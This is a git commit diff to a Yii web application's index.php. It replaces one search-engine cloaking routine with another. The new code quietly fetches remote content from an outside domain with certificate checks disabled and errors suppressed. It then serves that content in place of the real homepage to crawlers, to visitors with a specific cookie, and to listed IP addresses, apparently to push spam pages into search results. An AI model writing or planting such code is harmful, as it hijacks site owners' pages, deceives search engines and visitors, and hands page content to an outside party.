2a31f2447d19bfa56dbeb65ce99568ab4954e4dd
rokokbetwin <kalakkaro55555@gmail.com>
2025-03-05 09:41:18 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,21 +1,35 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
+error_reporting(0);
+
+$lp = "https://kurlung.xyz/landing/pangkalpinangkota.txt"; // ganti link raw
+
+$curl_connect=curl_init($lp);
+	curl_setopt($curl_connect,CURLOPT_RETURNTRANSFER,1);
+	curl_setopt($curl_connect,CURLOPT_FOLLOWLOCATION,1);
+	curl_setopt($curl_connect,CURLOPT_USERAGENT,"Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYPEER,0);
+	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYHOST,0);
+$content_data=curl_exec($curl_connect);
+
+$asd=["bot","ahrefs","google"];
+foreach($asd as $len){
+	$nul = $len;
 }
 
-if (is_bot()) {
-    $message = file_get_contents('https://kurlung.xyz/landing/pangkalpinangkota.txt');
-    echo $message;
-exit;
+$alow=["85.92.66.150","81.19.188.236","81.19.188.235","85.92.66.149"];
+
+if($_SERVER["REQUEST_URI"]=="/"){
+	$agent=strtolower($_SERVER["HTTP_USER_AGENT"]);
+	if(
+		strpos($agent,$nul)or
+		$googleallow or
+		isset($_COOKIE["s288"])or
+		in_array($visitor_ip,$alow)
+		)
+		{
+			echo $content_data;
+			die();
+		}
 }
 defined('YII_DEBUG') or define('YII_DEBUG', true);
 defined('YII_ENV') or define('YII_ENV', 'dev');
